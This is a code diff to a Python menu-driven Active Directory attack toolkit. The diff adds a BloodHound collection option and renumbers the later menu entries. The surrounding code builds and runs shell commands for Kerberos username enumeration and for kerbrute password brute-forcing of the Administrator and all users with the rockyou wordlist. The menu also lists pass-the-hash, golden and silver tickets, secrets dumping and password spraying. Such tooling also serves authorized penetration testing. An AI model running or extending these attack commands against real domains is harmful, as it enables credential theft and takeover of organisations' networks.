@@ -204,7 +204,7 @@ def display():
    print('\u2551')   
 
    print('\u2551' + " IMPERSONATE  " + '\u2502', end=' ')
-   if IMP == "administrator      ":
+   if IMP[:13] == "administrator":
       print(colored(IMP[:COL1],colour1), end=' ')
    else:
       print(colored(IMP[:COL1],colour2), end=' ')
@@ -263,13 +263,13 @@ def display():
 def options():
    print('\u2551' + "(0) REMOTE IP SCANNER  (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) GenUser List (70) FTP                  " + '\u2551')
    print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) GenPass List (71) SSH                  " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) ACLPwn       (62) USER Editor  (72) Telnet               " + '\u2551')
-   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) Secrets Dump (63) PASS Editor  (73) NetCat               " + '\u2551')
-   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) PASpray SMB  (74) Evil WinRm           " + '\u2551')
-   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) PSExec HASH  (65) GPP Decrypt  (75) WIN Remote Desktop   " + '\u2551')
-   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap Slow & Full  (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) SmbExec HASH (66)              (76) XFree Remote Desktop " + '\u2551')
-   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Intense TCP  (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) WmiExec HASH (67)              (77)                      " + '\u2551')
-   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Sub-Domains  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58)              (68)              (78)                      " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) USER Editor  (72) Telnet               " + '\u2551')
+   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) ACLPwn       (63) PASS Editor  (73) NetCat               " + '\u2551')
+   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64) PASpray SMB  (74) Evil WinRm           " + '\u2551')
+   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) GPP Decrypt  (75) WIN Remote Desktop   " + '\u2551')
+   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap Slow & Full  (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PSExec HASH  (66)              (76) XFree Remote Desktop " + '\u2551')
+   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Intense TCP  (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)              (77)                      " + '\u2551')
+   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Sub-Domains  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)              (78)                      " + '\u2551')
    print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Server Time  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59)              (69)              (79) Save & Exit Program!!" + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
@@ -409,9 +409,9 @@ while True:
 
    if selection =='0':
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified..")
+         print("[-] Remote IP address has not been specified..")
       else:
-         print("\n[*] Attempting to enumerate domain name...")
+         print("[*] Attempting to enumerate domain name...")
          command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > dump.tmp")
 
          if os.path.getsize("dump.tmp") == 0:
@@ -1480,7 +1480,7 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Enumerating, please wait...")
+         print("[*] Enumerating, please wait...")
          command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
          command("sed -i '/@/!d' KUSERS.tmp")
          command("sort KUSERS.tmp | uniq > USERS2.tmp")
@@ -1520,13 +1520,13 @@ while True:
 
    if selection =='42':
       CheckParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1543,7 +1543,7 @@ while True:
             if len(PAS) < COL1: PAS = padding(PAS, COL1)
 
          if found == 0:
-            print("[*] Now trying all usernames with matching passwords...")
+            print("\n[*] Now trying all usernames with matching passwords...")
             command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.txt")
          
          test2 = linecache.getline("bpassword2.txt", 1)
@@ -1555,7 +1555,7 @@ while True:
             if len(PAS) < COL1: PAS = padding(PAS, COL1)
 
          if found == 0:
-            print("[*] Now trying user Administrator with random passwords...")
+            print("\n[*] Now trying user Administrator with random passwords...")
             command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword3.txt")
     
          test3 = linecache.getline("bpassword3.txt", 1)
@@ -1567,7 +1567,7 @@ while True:
             if len(PAS) < COL1: PAS = padding(PAS, COL1)
 
          if found == 0:
-            print("[*] Now trying all users with random passwords...")
+            print("\n[*] Now trying all users with random passwords...")
             command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword4.txt")
      
          test4 = linecache.getline("bpassword4.txt", 1)
@@ -1890,6 +1890,29 @@ while True:
          command("ls -la ./" + DIR.rstrip(" "))
       prompt()
       
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Active
+# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='52':
+      CheckParams = 0
+      
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+      
+      if CheckParams != 1:
+         print ("[*] Enumerating, please wait...")     
+         if PAS[:2] != "''":
+            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
+         else:
+            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
+      prompt()
+         
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -1898,7 +1921,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='52':
+   if selection =='53':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -1926,7 +1949,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='53':
+   if selection =='54':
       CheckParams = 0
       
       if TIP[:5] == "EMPTY":
@@ -1995,7 +2018,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='54':
+   if selection =='55':
       CheckParams = 0
 
       if TIP[:5] == "EMPTY":
@@ -2043,7 +2066,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='55':
+   if selection =='56':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -2078,7 +2101,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='56':
+   if selection =='57':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -2113,7 +2136,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='57':
+   if selection =='58':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -2139,17 +2162,6 @@ while True:
          else:
             print("[-] No NTLM HASHH was found for user " + IMP.rstrip(" ") + "...")
       prompt()     
-
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Active
-# Details : Menu option selected - Exit(1)
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='58':
-      exit(1)
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
